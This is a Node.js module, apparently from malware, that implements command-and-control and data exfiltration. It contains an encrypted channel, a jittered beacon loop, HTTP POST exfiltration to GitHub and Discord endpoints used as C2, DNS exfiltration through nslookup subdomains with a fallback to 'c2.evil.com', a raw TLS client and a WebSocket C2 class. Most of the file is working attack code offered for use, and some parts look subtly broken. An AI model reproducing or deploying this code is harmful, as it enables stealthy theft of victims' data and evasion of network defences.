const crypto = require('crypto');
const http = require('http');
const https = require('https');
const { execSync } = require('child_process');
const net = require('net');
const tls = require('tls');

const IS_WIN = process.platform === 'win32';

// ─── AES-256-GCM ENCRYPTION ───────────────────────────────────────────────────
class SecureChannel {
  constructor() {
    this.key = null;
    this.iv = null;
    this.nonce = null;
    this.ephemeralKey = null;
    this.sharedKey = null;
    this.c2Servers = [
      'https://api.github.com',
      'https://raw.githubusercontent.com',
      'https://discord.com/api'
    ];
    this.currentServer = 0;
  }

  generateKey() {
    this.key = crypto.randomBytes(32);
    this.iv = crypto.randomBytes(12);
    this.nonce = crypto.randomBytes(12);
    return this.key;
  }

  ecdhExchange() {
    this.ephemeralKey = crypto.createECDH('secp256r1');
    this.ephemeralKey.generateKeys();
    return this.ephemeralKey.getPublicKey();
  }

  deriveSharedKey(peerPublicKey) {
    if (!this.ephemeralKey) return;
    this.sharedKey = this.ephemeralKey.computeSecret(peerPublicKey);
    this.key = crypto.createHash('sha256').update(this.sharedKey).digest();
  }

  encrypt(data) {
    if (!this.key) this.generateKey();
    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, this.nonce);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    const authTag = cipher.getAuthTag().toString('base64');
    return { encrypted, authTag, nonce: this.nonce.toString('base64'), key: this.key.toString('base64') };
  }

  decrypt(encryptedData) {
    try {
      const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, Buffer.from(encryptedData.nonce, 'base64'));
      decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'base64'));
      let decrypted = decipher.update(encryptedData.encrypted, 'base64', 'utf8');
      decrypted += decipher.final('utf8');
      return JSON.parse(decrypted);
    } catch (_) { return null; }
  }
}

// ─── BEACONING ────────────────────────────────────────────────────────────────
function jitter(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function beaconLoop(callback, minInterval = 30000, maxInterval = 300000) {
  while (true) {
    try {
      await callback();
      const delay = jitter(minInterval, maxInterval);
      await new Promise(r => setTimeout(r, delay));
    } catch (_) {
      await new Promise(r => setTimeout(r, jitter(5000, 15000)));
    }
  }
}

// ─── C2 FALLBACK ──────────────────────────────────────────────────────────────
async function exfil(data, webhookUrl = null) {
  const channel = new SecureChannel();
  const payload = channel.encrypt(data);
  const servers = webhookUrl ? [webhookUrl] : channel.c2Servers;
  
  for (let i = 0; i < servers.length; i++) {
    const server = servers[(channel.currentServer + i) % servers.length];
    try {
      const result = await sendToServer(server, payload);
      if (result) {
        channel.currentServer = (channel.currentServer + i + 1) % servers.length;
        return true;
      }
    } catch (_) { }
  }
  return false;
}

function sendToServer(server, payload) {
  return new Promise((resolve) => {
    const url = new URL(server);
    const isHttps = url.protocol === 'https:';
    const lib = isHttps ? https : http;
    
    const options = {
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
      }
    };

    const req = lib.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(res.statusCode >= 200 && res.statusCode < 300));
    });

    req.on('error', () => resolve(false));
    req.setTimeout(10000, () => { req.destroy(); resolve(false); });
    req.write(JSON.stringify(payload));
    req.end();
  });
}

// ─── DNS EXFILTRATION ─────────────────────────────────────────────────────────
function dnsExfil(data, domain) {
  if (!IS_WIN) return false;
  try {
    const encoded = Buffer.from(JSON.stringify(data)).toString('base64');
    const chunks = encoded.match(/.{1,63}/g) || [];
    let subdomain = '';
    for (const chunk of chunks.slice(0, 3)) {
      subdomain += chunk + '.';
    }
    execSync(`nslookup ${subdomain}${domain}`, { stdio: 'ignore', timeout: 5000 });
    return true;
  } catch (_) { return false; }
}

// ─── TLS 1.3 CUSTOM CLIENT ────────────────────────────────────────────────────
function tlsConnection(host, port = 443, data) {
  return new Promise((resolve, reject) => {
    const options = {
      host,
      port,
     servername: host,
      ALPNProtocols: ['h3', 'h2', 'http/1.1'],
      secureProtocol: 'TLS_client_method'
    };
    const conn = tls.connect(options, () => {
      conn.write(JSON.stringify(data) + '\n');
      let responseData = '';
      conn.on('data', chunk => responseData += chunk);
      conn.on('end', () => resolve(responseData));
      conn.on('error', reject);
      setTimeout(() => { conn.end(); resolve(''); }, 10000);
    });
  });
}

// ─── WEBSOCKET C2 ─────────────────────────────────────────────────────────────
class WebSocketC2 {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.connected = false;
  }

  connect() {
    return new Promise((resolve, reject) => {
      try {
        const WebSocket = require('ws');
        this.ws = new WebSocket(this.url);
        this.ws.on('open', () => { this.connected = true; resolve(true); });
        this.ws.on('error', reject);
        this.ws.on('message', (data) => {
          try {
            const msg = JSON.parse(data.toString());
            if (msg.type === 'exfil') {
              this.sendExfil(msg.payload);
            }
          } catch (_) { }
        });
      } catch (_) { reject(false); }
    });
  }

  sendExfil(payload) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type: 'exfil', data: payload }));
    }
  }

  close() {
    if (this.ws) {
      this.ws.close();
      this.connected = false;
    }
  }
}

// ─── MAIN EXPORTS ─────────────────────────────────────────────────────────────
async function exfiltrate(data, webhookUrl) {
  const channel = new SecureChannel();
  const encrypted = channel.encrypt(data);
  
  // Try HTTPS first
  const success = await exfil(encrypted, webhookUrl);
  
  // Fallback to DNS if HTTPS fails
  if (!success) {
    dnsExfil(data, 'c2.evil.com');
  }
  
  return success;
}

module.exports = {
  SecureChannel,
  exfiltrate,
  beaconLoop,
  jitter,
  dnsExfil,
  tlsConnection,
  WebSocketC2
};